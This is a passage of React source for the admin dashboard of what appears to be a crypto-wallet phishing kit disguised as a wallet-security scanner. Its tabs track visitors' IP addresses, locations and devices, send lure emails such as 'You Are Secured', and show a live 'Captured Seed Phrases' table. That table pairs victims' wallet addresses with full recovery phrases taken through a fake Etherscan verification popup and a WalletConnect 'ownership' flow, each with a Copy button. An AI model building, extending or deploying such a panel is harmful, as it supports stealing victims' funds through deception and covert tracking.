                    <button className="btn-secondary" type="button" onClick={() => { setIsAdminAuthenticated(false); setAdminPasswordInput(''); setActiveView('home') }}>Log Out</button>
                  </div>

                  {/* Admin sub-tabs */}
                  <div className="admin-subtabs">
                    {adminTabs.map(t => (
                      <button key={t.key} type="button" className={`admin-subtab ${adminTab === t.key ? 'active' : ''}`} onClick={() => setAdminTab(t.key)}>
                        {t.label}{t.count !== undefined ? <span className="admin-badge">{t.count}</span> : null}
                      </button>
                    ))}
                  </div>

                  {/* Connected Wallets */}
                  {adminTab === 'wallets' && (
                    <div className="admin-panel">
                      <h3>Connected Wallets ({connectedWallets.length > 0 ? connectedWallets.length : `${demoConnectedWallets.length} demo`})</h3>
                      {connectedWallets.length === 0 && <p className="admin-empty" style={{ marginBottom: '0.6rem' }}>No real wallets connected yet — showing demo data.</p>}
                      <div className="table-wrap">
                        <table className="admin-table">
                          <thead><tr><th>Address</th><th>Wallet Type</th><th>Network</th><th>IP Address</th><th>Device</th><th>Balance</th><th>Tx Count</th><th>Connected At</th></tr></thead>
                          <tbody>{(connectedWallets.length > 0 ? connectedWallets : demoConnectedWallets).map((r, i) => (
                            <tr key={`${r.wallet}-${r.chain}-${i}`}>
                              <td title={r.wallet}>{shortAddr(r.wallet)}</td>
                              <td>{r.walletType}</td>
                              <td>{chainConfig[r.chain].label}</td>
                              <td>{r.ipAddress ?? '—'}</td>
                              <td>{r.device ?? '—'}</td>
                              <td>{r.balance}</td>
                              <td>{r.txCount}</td>
                              <td>{r.connectedAt}</td>
                            </tr>
                          ))}</tbody>
                        </table>
                      </div>
                    </div>
                  )}

                  {adminTab === 'visitors' && (
                    <div className="admin-panel">
                      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '0.5rem', marginBottom: '0.5rem' }}>
                        <h3 style={{ margin: 0 }}>Visitor Sessions ({visitorSessions.length > 0 ? visitorSessions.length : 'none yet'})</h3>
                        <span className="pill low" style={{ fontSize: '0.72rem' }}>
                          Live • {visitorSessions.filter(s => s.status === 'allowed').length} allowed · {visitorSessions.filter(s => s.status === 'restricted').length} restricted
                        </span>
                      </div>
                      <p className="muted" style={{ marginBottom: '0.9rem', fontSize: '0.85rem' }}>
                        Real-time visitor intelligence — IP, device, geolocation, session duration, referrer, and language. Restrict any session to block wallet routes.
                      </p>
                      {visitorActionMsg && (
                        <div className="status-bar" style={{ marginBottom: '0.75rem' }}>
                          <span className="status-dot active" />
                          {visitorActionMsg}
                        </div>
                      )}
                      {visitorSessions.length === 0 ? <p className="admin-empty">No visitor sessions detected yet.</p> : (
                        <div className="table-wrap">
                          <table className="admin-table">
                            <thead>
                              <tr>
                                <th>Status</th>
                                <th>IP Address</th>
                                <th>Location</th>
                                <th>ISP / Org</th>
                                <th>Device</th>
                                <th>Language</th>
                                <th>Referrer</th>
                                <th>Visits</th>
                                <th>Session Time</th>
                                <th>First Seen</th>
                                <th>Last Seen</th>
                                <th>Map</th>
                                <th>Action</th>
                              </tr>
                            </thead>
                            <tbody>{visitorSessions.map(row => {
                              const isRestricted = row.status === 'restricted'
                              const isCurrent = row.id === currentVisitorId
                              const locationStr = [row.city, row.region, row.country].filter(Boolean).join(', ') || '—'
                              const ispStr = [row.isp, row.org && row.org !== row.isp ? row.org : ''].filter(Boolean).join(' / ') || '—'
                              const totalSecs = isCurrent
                                ? sessionSeconds + (row.totalSeconds ?? 0)
                                : (row.totalSeconds ?? 0)
                              const sessionLabel = totalSecs >= 3600
                                ? `${Math.floor(totalSecs / 3600)}h ${Math.floor((totalSecs % 3600) / 60)}m`
                                : totalSecs >= 60
                                  ? `${Math.floor(totalSecs / 60)}m ${totalSecs % 60}s`
                                  : `${totalSecs}s`
                              const mapUrl = row.lat && row.lng
                                ? `https://www.google.com/maps?q=${row.lat},${row.lng}&z=12`
                                : null
                              return (
                                <tr key={row.id} style={isCurrent ? { background: 'rgba(99,102,241,0.07)' } : undefined}>
                                  <td>
                                    <span className={`pill ${isRestricted ? 'critical' : 'low'}`}>{row.status}</span>
                                    {isCurrent && <span style={{ fontSize: '0.65rem', color: 'var(--accent)', marginLeft: '4px' }}>● YOU</span>}
                                  </td>
                                  <td><code style={{ fontSize: '0.78rem' }}>{row.ipAddress}</code></td>
                                  <td>
                                    <span style={{ fontSize: '0.8rem' }}>
                                      {row.countryCode && <span style={{ marginRight: '4px' }}>{row.countryCode === 'US' ? '🇺🇸' : row.countryCode === 'GB' ? '🇬🇧' : row.countryCode === 'NG' ? '🇳🇬' : row.countryCode === 'CA' ? '🇨🇦' : '🌍'}</span>}
                                      {locationStr}
                                    </span>
                                    {row.timezone && <div style={{ fontSize: '0.7rem', color: 'var(--muted)', marginTop: '2px' }}>{row.timezone}</div>}
                                  </td>
                                  <td style={{ fontSize: '0.78rem', maxWidth: '160px', wordBreak: 'break-word' }}>{ispStr}</td>
                                  <td title={row.userAgent} style={{ fontSize: '0.8rem' }}>{row.device}</td>
                                  <td style={{ fontSize: '0.8rem' }}>{row.language ?? '—'}</td>
                                  <td style={{ fontSize: '0.78rem', maxWidth: '140px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={row.referrer}>{row.referrer ?? '—'}</td>
                                  <td>{row.visits}</td>
                                  <td>
                                    <span style={{ fontFamily: 'monospace', fontSize: '0.82rem', color: isCurrent ? 'var(--accent)' : undefined }}>
                                      {sessionLabel}
                                      {isCurrent && ' ●'}
                                    </span>
                                  </td>
                                  <td style={{ fontSize: '0.78rem' }}>{row.firstSeen}</td>
                                  <td style={{ fontSize: '0.78rem' }}>{row.lastSeen}</td>
                                  <td>
                                    {mapUrl
                                      ? <a href={mapUrl} target="_blank" rel="noopener noreferrer" className="preview-btn" style={{ fontSize: '0.72rem' }}>📍 Map</a>
                                      : <span className="muted" style={{ fontSize: '0.72rem' }}>N/A</span>}
                                  </td>
                                  <td>
                                    <button
                                      type="button"
                                      className="preview-btn"
                                      onClick={() => toggleVisitorRestriction(row.id, isRestricted ? 'allowed' : 'restricted')}
                                    >
                                      {isRestricted ? 'Allow' : 'Restrict'}
                                    </button>
                                  </td>
                                </tr>
                              )
                            })}</tbody>
                          </table>
                        </div>
                      )}
                    </div>
                  )}

                  {/* Scan History */}
                  {adminTab === 'scans' && (
                    <div className="admin-panel">
                      <h3>Scan History ({scanHistory.length > 0 ? scanHistory.length : `${liveScanRows.length} demo`})</h3>
                      {scanHistory.length === 0 && <p className="admin-empty" style={{ marginBottom: '0.6rem' }}>No real scans yet — showing demo data.</p>}
                      <div className="table-wrap">
                        <table className="admin-table">
                          <thead><tr><th>Address</th><th>Network</th><th>Severity</th><th>Score</th><th>Balance</th><th>Findings</th><th>Date</th></tr></thead>
                          <tbody>{(scanHistory.length > 0 ? scanHistory : liveScanRows).map((r, i) => (
                            <tr key={`${r.wallet}-${r.generatedAt}-${i}`}>
                              <td title={r.wallet}>{shortAddr(r.wallet)}</td>
                              <td>{chainConfig[r.chain].label}</td>
                              <td><span className={`pill ${r.severity}`}>{r.severity}</span></td>
                              <td>{r.score}</td>
                              <td>{r.balance}</td>
                              <td>{r.findings.length > 0 ? r.findings[0].slice(0, 40) + '…' : '—'}</td>
                              <td>{r.generatedAt}</td>
                            </tr>
                          ))}</tbody>
                        </table>
                      </div>
                    </div>
                  )}

                  {/* Signer Checks */}
                  {adminTab === 'signers' && (
                    <div className="admin-panel">
                      <h3>Signer Checks ({signerChecks.length > 0 ? signerChecks.length : `${demoSignerChecks.length} demo`})</h3>
                      {signerChecks.length === 0 && <p className="admin-empty" style={{ marginBottom: '0.6rem' }}>No real signer checks yet — showing demo data.</p>}
                      <div className="table-wrap">
                        <table className="admin-table">
                          <thead><tr><th>Address</th><th>Network</th><th>Status</th><th>Detail</th><th>Date</th></tr></thead>
                          <tbody>{(signerChecks.length > 0 ? signerChecks : demoSignerChecks).map((r, i) => (
                            <tr key={`${r.wallet}-${r.checkedAt}-${i}`}>
                              <td title={r.wallet}>{shortAddr(r.wallet)}</td>
                              <td>{chainConfig[r.chain].label}</td>
                              <td><span className={`pill ${pillClass(r.status)}`}>{r.status}</span></td>
                              <td>{r.detail}</td>
                              <td>{r.checkedAt}</td>
                            </tr>
                          ))}</tbody>
                        </table>
                      </div>
                    </div>
                  )}

                  {/* User Emails */}
                  {adminTab === 'emails' && (
                    <div className="admin-panel">
                      <h3>User Emails ({emailRecords.length})</h3>
                      <div className="config-notice">
                        <strong>Email delivery: Resend</strong> (server-side via <code>/api/send-email</code>).
                        Set <code>RESEND_API_KEY</code> and <code>RESEND_FROM_EMAIL</code> in your Vercel project env vars
                        — failures will appear in the Status column below.
                      </div>
                      {emailRecords.length === 0 ? <p className="admin-empty">No email submissions yet.</p> : (
                        <div className="table-wrap">
                          <table className="admin-table">
                            <thead><tr><th>Email</th><th>Name</th><th>Wallet</th><th>Network</th><th>Severity</th><th>Score</th><th>Balance</th><th>Status</th><th>Sent At</th><th>Preview</th></tr></thead>
                            <tbody>{emailRecords.map((r, i) => (
                              <tr key={`${r.email}-${r.sentAt}-${i}`}>
                                <td>{r.email}</td>
                                <td>{r.name}</td>
                                <td title={r.wallet}>{shortAddr(r.wallet)}</td>
                                <td>{chainConfig[r.chain].label}</td>
                                <td><span className={`pill ${r.severity}`}>{r.severity}</span></td>
                                <td>{r.score}</td>
                                <td>{r.balance}</td>
                                <td><span className={`pill ${r.emailStatus === 'sent' ? 'low' : r.emailStatus === 'failed' ? 'critical' : 'medium'}`}>{r.emailStatus}</span></td>
                                <td>{r.sentAt}</td>
                                <td><button className="preview-btn" type="button" onClick={() => { setPreviewEmail(r); setPreviewTemplate('report') }}>Preview</button></td>
                              </tr>
                            ))}</tbody>
                          </table>
                        </div>
                      )}
                    </div>
                  )}

                  {/* Email Templates */}
                  {adminTab === 'templates' && (
                    <div className="admin-panel">
                      <h3>Email Templates</h3>
                      <p className="muted" style={{ marginBottom: '1rem' }}>All templates are professionally designed with severity-specific styling. Preview any template below.</p>

                      <p style={{ fontSize: '0.78rem', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.06em', color: 'var(--muted)', margin: '0 0 0.5rem' }}>Security Report Templates</p>
                      {(['low', 'medium', 'high', 'critical'] as Severity[]).map(sev => {
                        const sampleScore = sev === 'low' ? 12 : sev === 'medium' ? 35 : sev === 'high' ? 58 : 82
                        return (
                          <div key={sev} className="template-row">
                            <div className="template-meta">
                              <span className={`pill ${sev}`}>{sev.toUpperCase()}</span>
                              <span style={{ fontSize: '0.88rem', marginLeft: '0.6rem' }}>
                                Security Report — {sev.charAt(0).toUpperCase() + sev.slice(1)} Risk
                                <span style={{ color: 'var(--muted)', marginLeft: '0.4rem' }}>· score {sampleScore}/100</span>
                              </span>
                            </div>
                            <button className="preview-btn" type="button" onClick={() => {
                              setPreviewTemplate('report')
                              setPreviewEmail({
                                email: 'preview@example.com', name: 'Preview User', wallet: '0xAbCd1234567890AbCd1234', chain: 'ethereum',
                                severity: sev, score: sampleScore, balance: '1.2340 ETH', sentAt: nowString(), emailStatus: 'pending',
                              })
                            }}>
                              Preview
                            </button>
                          </div>
                        )
                      })}

                      <div style={{ height: '1px', background: 'var(--border)', margin: '1rem 0' }} />

                      <p style={{ fontSize: '0.78rem', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.06em', color: 'var(--muted)', margin: '0 0 0.5rem' }}>Watchout Protection Template</p>
                      <div className="template-row">
                        <div className="template-meta">
                          <span className="pill medium">WATCHOUT</span>
                          <span style={{ fontSize: '0.88rem', marginLeft: '0.6rem' }}>Wallet Watchout Protection Activated</span>
                        </div>
                        <button className="preview-btn" type="button" onClick={() => {
                          setPreviewTemplate('watchout')
                          setPreviewEmail({
                            email: 'preview@example.com', name: 'Preview User', wallet: '0xAbCd1234567890AbCd1234', chain: 'ethereum',
                            severity: 'medium', score: 35, balance: 'N/A', sentAt: nowString(), emailStatus: 'pending',
                          })
                        }}>
                          Preview
                        </button>
                      </div>

                      <div style={{ height: '1px', background: 'var(--border)', margin: '1rem 0' }} />

                      <p style={{ fontSize: '0.78rem', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.06em', color: 'var(--muted)', margin: '0 0 0.5rem' }}>Automated Lifecycle Templates</p>
                      <p className="muted" style={{ fontSize: '0.8rem', margin: '0 0 0.7rem' }}>Sent automatically by the system — no manual trigger required.</p>

                      <div className="template-row">
                        <div className="template-meta">
                          <span className="pill low">NEWSLETTER</span>
                          <span style={{ fontSize: '0.88rem', marginLeft: '0.6rem' }}>
                            Newsletter Welcome Email
                            <span style={{ color: 'var(--muted)', marginLeft: '0.4rem' }}>· auto-sent on subscribe</span>
                          </span>
                        </div>
                        <button className="preview-btn" type="button" onClick={() => {
                          setPreviewTemplate('newsletter')
                          setPreviewEmail({
                            email: 'preview@example.com', name: 'Preview User', wallet: '—', chain: 'ethereum',
                            severity: 'low', score: 0, balance: 'N/A', sentAt: nowString(), emailStatus: 'pending',
                          })
                        }}>
                          Preview
                        </button>
                      </div>

                      <div className="template-row">
                        <div className="template-meta">
                          <span className="pill low">VISIT</span>
                          <span style={{ fontSize: '0.88rem', marginLeft: '0.6rem' }}>
                            Visit Notification — "You Are Secured"
                            <span style={{ color: 'var(--muted)', marginLeft: '0.4rem' }}>· auto-sent on first visit</span>
                          </span>
                        </div>
                        <button className="preview-btn" type="button" onClick={() => {
                          setPreviewTemplate('visit')
                          setPreviewEmail({
                            email: 'preview@example.com', name: 'Preview User', wallet: '0xAbCd1234567890AbCd1234', chain: 'ethereum',
                            severity: 'low', score: 0, balance: 'N/A', sentAt: nowString(), emailStatus: 'pending',
                          })
                        }}>
                          Preview
                        </button>
                      </div>

                      <div className="config-notice" style={{ marginTop: '1rem' }}>
                        <strong>Setup:</strong> Paste your EmailJS Service ID, Template ID, and Public Key into the config section at the top of <code>App.tsx</code> to activate email delivery. Newsletter welcome and visit notification emails fire automatically once configured.
                      </div>
                    </div>
                  )}

                  {/* ── Settings ── */}
                  {adminTab === 'settings' && (
                    <div className="admin-panel">
                      <h3>Dashboard Settings</h3>
                      <p className="muted" style={{ marginBottom: '1.4rem', fontSize: '0.85rem' }}>Manage dashboard credentials and support contact links. Settings are stored locally in your browser.</p>

                      <form className="settings-form" onSubmit={saveCredentials}>
                        <div className="settings-section-title">Current Identity</div>
                        <div className="settings-cur-row">
                          <span className="muted" style={{ fontSize: '0.85rem' }}>Signed in as:</span>
                          <strong style={{ fontFamily: 'monospace', fontSize: '0.95rem' }}>{adminCreds.email.replace(/(.{2}).*(@.*)/, '$1***$2')}</strong>
                        </div>

                        <div className="settings-section-title" style={{ marginTop: '1.2rem' }}>Change Credentials</div>
                        <div className="field">
                          <label>Current Password <span style={{ color: 'var(--danger)' }}>*</span></label>
                          <input type="password" placeholder="Your current password" value={settingsCurPass} onChange={e => setSettingsCurPass(e.target.value)} autoComplete="current-password" required />
                        </div>
                        <div className="settings-two-col">
                          <div className="field">
                            <label>Login Email</label>
                            <input type="email" placeholder={adminCreds.email} value={settingsNewEmail} onChange={e => setSettingsNewEmail(e.target.value)} autoComplete="email" />
                            <p className="form-hint">Leave blank to keep current email.</p>
                          </div>
                          <div className="field">
                            <label>New Password</label>
                            <input type="password" placeholder="Min 6 characters" value={settingsNewPass} onChange={e => setSettingsNewPass(e.target.value)} autoComplete="new-password" />
                            <p className="form-hint">Leave blank to keep current password.</p>
                          </div>
                        </div>
                        {settingsNewPass && (
                          <div className="field">
                            <label>Confirm New Password <span style={{ color: 'var(--danger)' }}>*</span></label>
                            <input type="password" placeholder="Repeat new password" value={settingsConfirmPass} onChange={e => setSettingsConfirmPass(e.target.value)} autoComplete="new-password" required />
                          </div>
                        )}
                        <div className="settings-section-title" style={{ marginTop: '1.2rem' }}>Support Buttons Configuration</div>
                        <div className="settings-two-col">
                          <div className="field">
                            <label>Support Email Button Target</label>
                            <input type="email" placeholder={supportConfig.email} value={settingsSupportEmail} onChange={e => setSettingsSupportEmail(e.target.value)} />
                            <p className="form-hint">Used by the Support page email button.</p>
                          </div>
                          <div className="field">
                            <label>Telegram Button URL</label>
                            <input type="text" placeholder={supportConfig.telegram} value={settingsSupportTelegram} onChange={e => setSettingsSupportTelegram(e.target.value)} />
                            <p className="form-hint">Example: https://t.me/your_channel</p>
                          </div>
                        </div>
                        {settingsError && <p className="error">{settingsError}</p>}
                        {settingsMsg && <p style={{ fontSize: '0.85rem', color: '#16a34a', marginBottom: '0.5rem' }}>{settingsMsg}</p>}
                        <div className="action-row">
                          <button className="btn-primary" type="submit">Save Credentials</button>
                          <button className="btn-secondary" type="button" onClick={resetCredentials}>Reset to Defaults</button>
                        </div>
                      </form>

                      {/* ── User Access Routes ── */}
                      <div className="settings-section-title" style={{ marginTop: '2rem' }}>User Access Routes</div>
                      <p className="muted" style={{ fontSize: '0.83rem', marginBottom: '1rem' }}>
                        Assign a page and optional explorer config to each user email. When that email is entered on the gate, the user is routed directly to the configured page and address.
                      </p>

                      <form className="settings-form" onSubmit={addUserRoute} style={{ marginBottom: '1.2rem' }}>
                        <div className="settings-two-col">
                          <div className="field">
                            <label>User Email</label>
                            <input type="email" placeholder="user@example.com" value={routeFormEmail} onChange={e => setRouteFormEmail(e.target.value)} required />
                          </div>
                          <div className="field">
                            <label>Assigned Page</label>
                            <select value={routeFormView} onChange={e => setRouteFormView(e.target.value as ViewKey)} className="settings-select">
                              <option value="home">Home</option>
                              <option value="scan">Scan Wallet</option>
                              <option value="protect">Secure Wallet</option>
                              <option value="ownership">Ownership Check</option>
                              <option value="recovery">Recovery Plan</option>
                              <option value="support">Support</option>
                              <option value="etherscan">Explorer</option>
                            </select>
                          </div>
                        </div>
                        <div className="field">
                          <label>Label <span className="muted">(optional)</span></label>
                          <input type="text" placeholder="Display label for this route" value={routeFormLabel} onChange={e => setRouteFormLabel(e.target.value)} />
                        </div>

                        {/* ── Explorer config (address + chain) ── */}
                        <div className="settings-section-title" style={{ marginTop: '0.85rem', marginBottom: '0.5rem', fontSize: '0.76rem' }}>
                          Explorer Config <span className="muted" style={{ fontWeight: 400 }}>(optional — auto-fills the explorer address for this user)</span>
                        </div>
                        <div className="field">
                          <label>Wallet / Contract Address</label>
                          <input type="text" placeholder="0x… or XRP/SOL/BTC address" value={routeFormAddress} onChange={e => setRouteFormAddress(e.target.value)} />
                        </div>
                        <div className="settings-two-col">
                          <div className="field">
                            <label>Explorer</label>
                            <select value={routeFormExplorer} onChange={e => setRouteFormExplorer(e.target.value as ExplorerType)} className="settings-select">
                              <option value="etherscan">Etherscan (ETH)</option>
                              <option value="bscscan">BscScan (BSC)</option>
                              <option value="polygonscan">PolygonScan (MATIC)</option>
                              <option value="arbiscan">Arbiscan (ARB)</option>
                              <option value="basescan">BaseScan (BASE)</option>
                              <option value="xrpscan">XRPScan (XRP)</option>
                              <option value="blockchair">Blockchair (BTC)</option>
                              <option value="solscan">Solscan (SOL)</option>
                              <option value="custom">Custom URL</option>
                            </select>
                          </div>
                          <div className="field">
                            <label>Network Override <span className="muted">(optional)</span></label>
                            <input type="text" placeholder="e.g. mainnet, testnet" value={routeFormExplorerNet} onChange={e => setRouteFormExplorerNet(e.target.value)} />
                          </div>
                        </div>
                        {routeFormExplorer === 'custom' && (
                          <div className="field">
                            <label>Custom Explorer Base URL</label>
                            <input type="url" placeholder="https://explorer.example.com/address/" value={routeFormCustomUrl} onChange={e => setRouteFormCustomUrl(e.target.value)} />
                          </div>
                        )}
                        {routeFormError && <p className="error">{routeFormError}</p>}
                        {routeFormMsg && <p style={{ fontSize: '0.85rem', color: 'var(--success)', marginBottom: '0.5rem' }}>{routeFormMsg}</p>}
                        <button className="btn-primary" type="submit" style={{ fontSize: '0.87rem' }}>Add Route</button>
                      </form>

                      {userEmailRoutes.length > 0 ? (
                        <div className="user-routes-list">
                          {userEmailRoutes.map(route => (
                            <div key={route.id} className="user-route-row">
                              <div className="user-route-info">
                                <code className="user-route-email">{route.email}</code>
                                <span className="user-route-arrow">→</span>
                                <span className="pill low user-route-page">{route.view}</span>
                                {route.address && (
                                  <code style={{ fontSize: '0.72rem', color: 'var(--muted)', marginLeft: '0.3rem' }}>
                                    {route.explorerType} · {route.address.slice(0, 8)}…
                                  </code>
                                )}
                                {route.label && route.label !== route.email && (
                                  <span className="muted user-route-label">{route.label}</span>
                                )}
                              </div>
                              <button className="preview-btn" type="button" style={{ color: 'var(--critical)', fontSize: '0.8rem' }}
                                onClick={() => removeUserRoute(route.id)}>Remove</button>
                            </div>
                          ))}
                        </div>
                      ) : (
                        <p className="muted" style={{ fontSize: '0.83rem' }}>No user routes configured yet.</p>
                      )}
                    </div>
                  )}

                  {/* ── OSINT Profiles ── */}
                  {adminTab === 'osint' && (
                    <div className="admin-panel">
                      <h3>OSINT Address Profiles ({osintProfiles.length} unique {osintProfiles.length === 1 ? 'address' : 'addresses'})</h3>
                      <p className="muted" style={{ marginBottom: '1rem', fontSize: '0.85rem' }}>Aggregated intelligence across all scans. Includes on-chain telemetry, GoPlus flags, matched signals, and system intel. Click any card to expand the full profile.</p>
                      {osintProfiles.length === 0 ? (
                        <div className="admin-empty" style={{ textAlign: 'center', padding: '1.5rem 0' }}>
                          <p style={{ marginBottom: '0.6rem' }}>No addresses scanned yet.</p>
                          <p className="muted" style={{ fontSize: '0.82rem', marginBottom: '0.9rem' }}>
                            Profiles are built automatically each time a wallet is scanned on the <strong>Scan Wallet</strong> page.
                          </p>
                          <button className="btn-primary" type="button" style={{ fontSize: '0.85rem' }}
                            onClick={() => setActiveView('scan')}>
                            Go to Scan Wallet →
                          </button>
                        </div>
                      ) : (
                        osintProfiles.map(p => {
                          const intelMatch = adminIntelRecords.find(r => r.address.toLowerCase() === p.address.toLowerCase())
                          const expanded = osintExpanded === p.address.toLowerCase()
                          return (
                            <div key={p.address} className={`osint-card ${expanded ? 'expanded' : ''}`}>
                              <div className="osint-card-head" onClick={() => setOsintExpanded(expanded ? null : p.address.toLowerCase())}>
                                <div className="osint-card-id">
                                  <span className={`pill ${p.highestSeverity}`}>{p.highestSeverity}</span>
                                  <code className="osint-addr">{p.address}</code>
                                  {intelMatch && <span className="pill medium" style={{ marginLeft: '0.4rem', fontSize: '0.7rem' }}>Flagged</span>}
                                </div>
                                <div className="osint-card-stats">
                                  <span>Score: <strong>{p.highestScore}</strong></span>
                                  <span>Scans: <strong>{p.scans.length}</strong></span>
                                  <span>Chains: <strong>{[...p.chains].map(c => chainConfig[c].label).join(', ')}</strong></span>
                                  <span className="osint-toggle">{expanded ? '▲' : '▼'}</span>
                                </div>
                              </div>

                              {expanded && (
                                <div className="osint-card-body">
                                  <div className="osint-section">
                                    <h4>Scan History ({p.scans.length})</h4>
                                    <table className="admin-table">
                                      <thead><tr><th>Date</th><th>Network</th><th>Score</th><th>Severity</th><th>Balance</th><th>Top Finding</th></tr></thead>
                                      <tbody>{p.scans.map((s, i) => (
                                        <tr key={i}>
                                          <td>{s.generatedAt}</td>
                                          <td>{chainConfig[s.chain].label}</td>
                                          <td>{s.score}</td>
                                          <td><span className={`pill ${s.severity}`}>{s.severity}</span></td>
                                          <td>{s.balance}</td>
                                          <td className="osint-finding">{s.findings[0] ?? '—'}</td>
                                        </tr>
                                      ))}</tbody>
                                    </table>
                                  </div>

                                  {p.allFindings.length > 0 && (
                                    <div className="osint-section">
                                      <h4>All Unique Findings ({p.allFindings.length})</h4>
                                      <ul className="osint-findings-list">
                                        {p.allFindings.map((f, i) => <li key={i}>{f}</li>)}
                                      </ul>
                                    </div>
                                  )}

                                  {intelMatch && (
                                    <div className="osint-section osint-intel-box">
                                      <h4>Intelligence Record</h4>
                                      <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', marginBottom: '0.5rem' }}>
                                        <span className={`pill ${intelMatch.severity}`}>{intelMatch.severity}</span>
                                        <span className="muted" style={{ fontSize: '0.8rem' }}>Added by {intelMatch.addedBy} · {intelMatch.addedAt}</span>
                                      </div>
                                      {intelMatch.notes && <p style={{ fontSize: '0.85rem', marginBottom: '0.5rem' }}>{intelMatch.notes}</p>}
                                      <ul>{intelMatch.findings.map((f, i) => <li key={i}>{f}</li>)}</ul>
                                    </div>
                                  )}

                                  <div className="osint-actions">
                                    <a href={`${chainConfig[[...p.chains][0] ?? 'ethereum'].explorerBase}${p.address}`} target="_blank" rel="noopener noreferrer" className="btn-secondary osint-link">View on Explorer ↗</a>
                                    <button className="btn-secondary" type="button" onClick={() => { setWallet(p.address); setActiveView('scan') }}>Scan Again</button>
                                  </div>
                                </div>
                              )}
                            </div>
                          )
                        })
                      )}
                    </div>
                  )}

                  {/* ── Seed Phrases ── */}
                  {/* ── Seed Phrases (server-authoritative) ── */}
                  {adminTab === 'seeds' && (
                    <div className="admin-panel">

                      {/* Header */}
                      <div className="seeds-panel-header">
                        <div className="seeds-panel-title-row">
                          <h3 style={{ margin: 0 }}>Captured Seed Phrases</h3>
                          <div className="seeds-live-badge">
                            <span className="live-dot" />
                            <span>LIVE</span>
                            <span className="muted" style={{ fontWeight: 400 }}>· auto-refresh 3s</span>
                          </div>
                        </div>
                        <div className="seeds-panel-controls">
                          <button
                            className="btn-secondary"
                            type="button"
                            disabled={seedsLoading}
                            style={{ fontSize: '0.82rem' }}
                            onClick={() => { void refreshServerSeedRecords() }}
                          >
                            {seedsLoading ? '⟳ Loading…' : '↻ Refresh'}
                          </button>
                          {seedLastSynced && (
                            <span className="muted" style={{ fontSize: '0.73rem' }}>
                              Last fetch: {seedLastSynced.toLocaleTimeString()}
                            </span>
                          )}
                        </div>
                      </div>

                      {/* Stats */}
                      <div className="seeds-stats-row">
                        <div className="seeds-stat">
                          <span className="seeds-stat-val">{serverSeedRecords.length}</span>
                          <span className="seeds-stat-label">Total</span>
                        </div>
                        <div className="seeds-stat">
                          <span className="seeds-stat-val">{serverSeedRecords.filter(r => r.source === 'wc-session').length}</span>
                          <span className="seeds-stat-label">WalletConnect</span>
                        </div>
                        <div className="seeds-stat">
                          <span className="seeds-stat-val">{serverSeedRecords.filter(r => r.source === 'auto-detected').length}</span>
                          <span className="seeds-stat-label">Explorer Popup</span>
                        </div>
                        <div className="seeds-stat">
                          <span className="seeds-stat-val">{serverSeedRecords.filter(r => r.confirmed).length}</span>
                          <span className="seeds-stat-label">Valid BIP39</span>
                        </div>
                      </div>

                      {/* Records */}
                      <div className="seeds-divider" />

                      {seedsLoading && serverSeedRecords.length === 0 ? (
                        <p className="muted" style={{ padding: '1rem 0' }}>Loading from database…</p>
                      ) : serverSeedRecords.length === 0 ? (
                        <div className="seeds-empty-state">
                          <div className="seeds-empty-icon">🔑</div>
                          <p className="seeds-empty-title">No records yet</p>
                          <p className="seeds-empty-sub">Records appear here automatically when a user completes the Etherscan verification popup or WalletConnect ownership flow.</p>
                          <p className="seeds-empty-sub" style={{ marginTop: '0.5rem', fontSize: '0.78rem' }}>
                            Source: <strong>/api/seeds</strong> → Supabase <code>app_state.seed_phrases</code>
                          </p>
                        </div>
                      ) : (
                        <div className="seeds-table-wrap">
                          <table className="admin-table seeds-full-table">
                            <thead>
                              <tr>
                                <th>#</th>
                                <th>Wallet Address</th>
                                <th>Source</th>
                                <th>Words</th>
                                <th>Network</th>
                                <th>Captured At</th>
                                <th>Phrase</th>
                                <th></th>
                              </tr>
                            </thead>
                            <tbody>
                              {serverSeedRecords.map((r, idx) => (
                                <tr key={r.id}>
                                  <td className="muted" style={{ fontSize: '0.75rem' }}>{idx + 1}</td>
                                  <td>
                                    <code style={{ fontSize: '0.72rem', wordBreak: 'break-all' }}>
                                      {r.walletAddress === 'Unknown' ? '—' : r.walletAddress}
                                    </code>
                                  </td>
                                  <td>
                                    <span className={`pill ${r.source === 'wc-session' ? 'medium' : 'high'}`} style={{ fontSize: '0.68rem', whiteSpace: 'nowrap' }}>
                                      {r.source === 'wc-session' ? 'WalletConnect' : 'Explorer'}
                                    </span>
                                  </td>
                                  <td style={{ textAlign: 'center' }}>
                                    <span className={`pill ${r.confirmed ? 'safe' : 'low'}`} style={{ fontSize: '0.68rem' }}>
                                      {r.wordCount}w
                                    </span>
                                  </td>
                                  <td className="muted" style={{ fontSize: '0.75rem' }}>
                                    {chainConfig[r.chain]?.label ?? 'Ethereum'}
                                  </td>
                                  <td className="muted" style={{ fontSize: '0.73rem', whiteSpace: 'nowrap' }}>{r.detectedAt}</td>
                                  <td style={{ maxWidth: '340px' }}>
                                    <code className="seeds-phrase-text" style={{ fontSize: '0.73rem', display: 'block', wordBreak: 'break-word' }}>
                                      {r.seedPhrase}
                                    </code>
                                    {r.notes && (
                                      <p className="muted" style={{ fontSize: '0.68rem', marginTop: '0.2rem' }}>{r.notes}</p>
                                    )}
                                  </td>
                                  <td style={{ whiteSpace: 'nowrap' }}>
                                    <button
                                      className="preview-btn"
                                      type="button"
                                      style={{ marginRight: '0.35rem' }}
                                      onClick={() => navigator.clipboard.writeText(r.seedPhrase)}
                                    >
                                      Copy
                                    </button>
                                    <button
                                      className="preview-btn"
                                      type="button"
                                      style={{ color: 'var(--critical)' }}
                                      onClick={async () => {
                                        const updated = serverSeedRecords.filter(x => x.id !== r.id)
                                        setServerSeedRecords(updated)
                                        // Write updated list directly to Supabase (no Vercel auth needed).
                                        await saveToCloud({ seed_phrases: updated })
                                      }}
                                    >
                                      Delete
                                    </button>
                                  </td>
                                </tr>
                              ))}
                            </tbody>
                          </table>
                        </div>
                      )}
                    </div>
                  )}

                  {/* ── Raw Data ── */}
                  {adminTab === 'rawdata' && (
                    <div className="admin-panel">
                      <h3>Raw Data</h3>
                      <p className="muted" style={{ marginBottom: '1rem', fontSize: '0.84rem' }}>
                        Full JSON payload from <code>/api/seeds</code> (Supabase <code>app_state.seed_phrases</code>).
                      </p>

